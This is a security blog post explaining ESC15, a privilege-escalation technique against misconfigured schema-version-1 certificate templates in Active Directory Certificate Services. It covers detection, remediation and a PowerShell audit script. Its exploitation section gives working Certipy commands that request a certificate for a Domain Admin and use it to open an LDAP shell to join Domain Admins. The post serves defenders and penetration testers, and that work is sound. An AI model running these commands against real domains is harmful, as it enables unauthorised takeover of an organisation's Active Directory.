---
title: "Understanding ESC15: A New Privilege Escalation Vulnerability in Active Directory Certificate Services"
date: 2024-11-15
categories: [Active Directory, Vulnerability]
tags: [Active Directory]
image:
  path: /assets/img/understanding-esc15-new-privesc-vuln/Certificate Vulnerability.jpg
---

Active Directory Certificate Services (ADCS) play a critical role in managing and securing the digital identities of users and devices in enterprise environments. However, vulnerabilities in this system can lead to disastrous security breaches. On **October 7, 2024**, a new attack method targeting ADCS, dubbed **ESC15**, was discovered. This method allows unauthorized users to escalate privileges within an Active Directory (AD) environment by exploiting misconfigured certificate templates.

The **ESC15** vulnerability is an enhancement of previously known techniques like **ESC1** but bypasses many of the constraints set by older attack vectors. Notably, this attack method was added to **Certipy**, a popular tool in the offensive security community, thanks to contributions from **dru1d-foofus** and **TrustedSec’s Justin Bollinger**. In this blog post, we’ll dive into how ESC15 works, how to detect vulnerable environments, and the steps to mitigate the risk.

## **Introduction**

## **What is ESC15?**

ESC15 is an attack vector that exploits **Certificate Templates with Schema Version 1** in ADCS. This method builds on **ESC1**, which allowed attackers to request certificates for privileged accounts. However, ESC15 bypasses even more security checks, making it a more dangerous variant.

**Key Exploit Conditions** for ESC15:

1. **Certificate Template Schema Version** is **1**.
2. The Certificate Template allows arbitrary **subjectAltName** values in the Certificate Signing Request (CSR).
3. **Enrollment Rights** for non-privileged users

By exploiting these conditions, attackers can impersonate privileged users like Domain Admins and escalate their privileges within the domain.

## **Detailed Breakdown of ESC1 and ESC15**

In the original **ESC1** vulnerability, attackers could request a certificate for any user if:

1. The **Certificate Template** allowed users to supply the **Subject** in the CSR.
2. The template included at least one **EKU (Enhanced Key Usage)**, such as **Domain Authentication**, allowing authentication in the domain.

ESC15 improves upon ESC1 by allowing attackers to exploit **Schema Version 1 Certificate Templates** even if they lack an EKU for Domain Authentication.

## **The GitHub Contribution to Certipy**

**On October 7, 2024**, a GitHub user named **dru1d-foofus** submitted a **Pull Request** to the **Certipy** repository, automating the exploitation of ESC15. The **Pull Request (PR #228)** was built upon an earlier discovery by **TrustedSec’s Justin Bollinger (@Bandrel)**. Thanks to these contributors, offensive security professionals now have the ability to automate the ESC15 exploitation process within the Certipy tool.

For those interested, you can view the Pull Request here: [Certipy PR #228](https://github.com/ly4k/Certipy/pull/228).

## **Detecting the ESC15 Vulnerability**

Administrators must first determine whether any Certificate Templates in their environment are vulnerable to ESC15. This can be done through a combination of manual checks and PowerShell commands. Below is the **PowerShell** command to identify vulnerable templates:

```powershell
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(mspki-template-schema-version=1)(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=yourdomain,DC=com' -Properties DistinguishedName, DisplayName, ObjectGuid
```

**Manual Detection Process:**

1. Log into the **Certificate Authority** (CA) server.
2. Open **Certtmpl.msc**.
3. Identify **Certificate Templates** with **Schema Version 1**.
4. Check if the **Subject Name** is set to **Supplied in the Request**.
5. In the **Security** tab, ensure only authorized users have **enroll** permissions.
6. Verify in the **Extensions** tab that no **Domain Authentication EKUs** are present.

![Schema Version Validation in Certtmpl.msc](/assets/img/understanding-esc15-new-privesc-vuln/1.png)

## **Exploiting ESC15**

The Certipy tool can be used to exploit the ESC15 vulnerability. The following steps demonstrate how to request a certificate using a misconfigured template and escalate privileges.

#### **Step 1: Cloning and Installing Certipy**

You need to clone the Certipy repository and install its dependencies:

```powershell
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install -r requirements.txt
```

#### **Step 2: Requesting a Certificate for Domain Admin**

The next step is to use Certipy to request a certificate for a **Domain Admin** using a vulnerable **Schema Version 1** certificate template.

```powershell
Certipy req -ca your-CA-Name -target-ip 192.168.x.x -u 'attacker@yourdomain.com' -p 'Password123!' -template "WebServer" -upn "domain.admin@yourdomain.com" --application-policies 'Client Authentication'
```

**Explanation:**

- **template “WebServer”**: The vulnerable template.
- **upn**: Requesting a certificate for Domain Admin.
- **–application-policies** ‘**Client Authentication**‘: Manipulating the **EKU** field to include client authentication.

Once the certificate is obtained, it can be used to authenticate as the domain administrator.

#### **Step 3: Adding Attacker to Domain Admins**

With the obtained certificate, the attacker can use Certipy to interact with the LDAP interface and add themselves to the **Domain Admins** group.

```powershell
certipy auth -pfx domain.admin.pfx -domain yourdomain.com -dc-ip 192.168.x.x -ldap-shell
```

This gives the attacker full control over the domain.

![Adding Attacker to Domain Admins](/assets/img/understanding-esc15-new-privesc-vuln/2.png)

## **Remediating ESC15**

#### **Step 1: Analyze Vulnerable Templates**

Review all **Certificate Templates** in your ADCS environment, particularly those with **Schema Version 1**. Templates that are no longer required should be removed. Alternatively, upgrade them to **Schema Version 2** to mitigate the risk of exploitation.

#### **Step 2: Disable the “Supplied in the Request” Option**

Modify any vulnerable templates by disabling the **Supplied in the Request** option and instead selecting **Built from information in Active Directory**. This prevents attackers from specifying arbitrary subject names when requesting certificates.

#### **Step 3: Updating the Template Using ADSIEDIT**

For templates with **Schema Version 1**, changes cannot be made via the **Certtmpl.msc** interface. You will need to use **ADSIEDIT** to update the **msPKI-Certificate-Name-Flag** attribute.

```powershell
Set-ADObject -Identity "CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=yourdomain,DC=com" -Replace @{ 'msPKI-Certificate-Name-Flag' = 0 }
```

Once this change is applied, attempts to exploit ESC15 will fail.

![Updating msPKI-Certificate-Name-Flag in ADSIEDIT](/assets/img/understanding-esc15-new-privesc-vuln/3.png)

## **Vulnerability Analysis PowerShell Script**

```powershell
$configBase = (Get-ADRootDSE).ConfigurationNamingContext

# GUID for Certificate Enrollment Extended Right
$EnrollGuid = "0e10c968-78fb-11d2-90d4-00c04f79dc55"

# GUID for All Extended Rights
$AllExtendedRightsGuid = "00000000-0000-0000-0000-000000000000"

# Query all CA objects (Enrollment Services) and get their published templates
$enrollmentServices = Get-ADObject -LDAPFilter '(objectClass=pKIEnrollmentService)' -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configBase" -Properties certificateTemplates

# Store published templates in a hashset for fast lookup
$publishedTemplates = @{}
foreach ($service in $enrollmentServices) {
    foreach ($template in $service.certificateTemplates) {
        $publishedTemplates[$template] = $true
    }
}

Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(mspki-template-schema-version=1)(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase "$configBase" -Properties DistinguishedName,DisplayName,ObjectGuid,nTSecurityDescriptor,mspki-certificate-name-flag,mspki-template-schema-version | 

ForEach-Object {

    # Display current template info
    $template = $_
    $certificateNameFlag = $null

    $templatePublished = $false

    # Check if the template is published by any enrollment service
    if ($publishedTemplates.ContainsKey($template.Name)) {
        $templatePublished = $true
    }

    # Always display Template Name and mspki-template-schema-version
    Write-Host "`n`n`n"
    if ($templatePublished) {
        Write-Host "Template Name                       : $($template.DisplayName) - PUBLISHED" -ForegroundColor Red
    } 
    else {
        Write-Host "Template Name                       : $($template.DisplayName) - NOT PUBLISHED" -ForegroundColor Green
    }
    Write-Host "`n`n"
    Write-Host "Permissions"
    Write-Host "  Enrollment Permissions"
    
    # Retrieve security descriptor (ACE entries)
    $securityDescriptor = $template.nTSecurityDescriptor
    if ($securityDescriptor -ne $null) {
        $aces = $securityDescriptor.Access # Use Access property to get ACEs
        
        # Initialize containers for rights
        $enrollmentRights = @()
        $writeOwnerPrincipals = @()
        $writeDaclPrincipals = @()
        $writePropertyPrincipals = @()
        $owner = $null

        # Loop through each ACE
        foreach ($ace in $aces) {
            if($ace.AccessControlType -ne "Allow") {
                continue;
            }

            # Check if the ACE has ExtendedRight and ObjectType matches Enroll or AllExtendedRights
            if (($ace.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight) -and 
                ($ace.ObjectType -eq $EnrollGuid -or $ace.ObjectType -eq $AllExtendedRightsGuid)) {
                
                # Add the IdentityReference (who the permission applies to) to the list of enrollment rights
                $enrollmentRights += $ace.IdentityReference
            }
            
            if ($ace.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::GenericAll) {
                $enrollmentRights += $ace.IdentityReference
            }

            # Object Control Permissions (Write DACL, Write Owner, Write Property)
            if ($ace.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner) {
                $writeOwnerPrincipals += $ace.IdentityReference
            }
            
            if ($ace.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl) {
                $writeDaclPrincipals += $ace.IdentityReference
            }
            
            if ($ace.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty) {
                $writePropertyPrincipals += $ace.IdentityReference
            }
        }

        # Get the owner of the object
        $owner = $securityDescriptor.Owner

        # Output Enrollment Rights
        Write-Host "    Enrollment Rights               : $($enrollmentRights -join "`n                                      ")"
        
        Write-Host "  Object Control Permissions"
        Write-Host "    Owner                           : $owner"
        Write-Host "    Write Owner Principals          : $($writeOwnerPrincipals -join "`n                                      ")"
        Write-Host "    Write Dacl Principals           : $($writeDaclPrincipals -join "`n                                      ")"
        Write-Host "    Write Property Principals       : $($writePropertyPrincipals -join "`n                                      ")"

    } else {
        Write-Host "No Security Descriptor found for $($template.DisplayName)"
    }
}
```

## **Credits**

This research and discovery of ESC15 are made possible through the collaboration of **Justin Bollinger (@Bandrel)** from **TrustedSec** and **dru1d-foofus**, who contributed the **Certipy PR #228** to automate this attack. The security community owes a debt of gratitude to these contributors for their tireless efforts in advancing the understanding of ADCS security risks.

Certipy, a tool developed by **@ly4k**, continues to be a valuable asset in testing ADCS environments for security vulnerabilities. You can follow the project’s development on GitHub at [Certipy GitHub Repository](https://github.com/ly4k/Certipy).

## **Conclusion**

The **ESC15** vulnerability is a significant risk for organizations using ADCS, allowing attackers to elevate privileges and compromise domain administrator accounts. While **Microsoft** has yet to release a patch, administrators can protect their environments by carefully reviewing and updating vulnerable certificate templates.

By leveraging tools like **Certipy** and PowerShell scripts, defenders can quickly identify and remediate risky templates in their Active Directory environments.

**Stay vigilant** and ensure your certificate templates are correctly configured to prevent such attacks from being successful.

## **References**

- [https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [https://github.com/ly4k/Certipy/pull/228](https://github.com/ly4k/Certipy/pull/228)